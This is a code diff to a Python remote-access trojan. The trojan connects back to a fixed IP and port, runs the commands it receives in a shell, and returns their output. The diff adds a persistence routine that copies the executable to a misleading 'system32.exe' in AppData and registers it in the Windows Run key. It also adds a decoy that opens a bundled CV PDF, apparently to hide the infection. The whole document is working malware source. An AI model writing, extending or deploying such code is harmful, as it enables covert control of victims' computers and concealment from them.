@@ -1,4 +1,4 @@
-import socket, os, base64
+import socket, os, base64, shutil, sys
 import subprocess as sp
 import simplejson as json
 
@@ -9,10 +9,7 @@ class Trojan:
 
     def command_execute(self, cmd):
         try:
-            if cmd[0] != "cd":
-                return sp.check_output(cmd, shell=True)
-            else:
-                return "Use 'go' instead of 'cd'\n"
+            return sp.check_output(cmd, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
         except:
             return "Command Not Found\n"
 
@@ -51,7 +48,7 @@ class Trojan:
             if cmd[0] == "exit":
                 self.connection.close()
                 exit()
-            elif cmd[0] == "go" and len(cmd) > 1:
+            elif cmd[0] == "cd" and len(cmd) > 1:
                 cmd_output = self.change_directory(cmd[1])
             elif cmd[0] == "read" and len(cmd) > 1:
                 if cmd[1] in os.listdir():
@@ -73,9 +70,29 @@ class Trojan:
             
             self.json_send(cmd_output)
 
+def add_to_regedit():
+    #persistence
+    new_file = os.environ["appdata"] + "\\system32.exe"
+    print(new_file)
+    if not os.path.exists(new_file):
+        shutil.copyfile(sys.executable, new_file)
+        regedit_cmd = f'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v sysupdate /t REG_SZ /d "{new_file}" '
+        os.system(regedit_cmd)
+
+def open_data():
+    file = sys._MEIPASS + "\\MUHAMMET_TALHA_ODABASI_CV.pdf"
+    sp.Popen(file, shell=True)
+
+
+port = 4141
+ip = "192.168.1.104"
 
 if __name__ == "__main__":
-    connector = Trojan("192.168.1.104", 4141)
-    connector.start_executer()
-
+    try:
+        #add_to_regedit()
+        #open_data()
+        connector = Trojan(ip, int(port))
+        connector.start_executer()
+    except:
+        pass
         
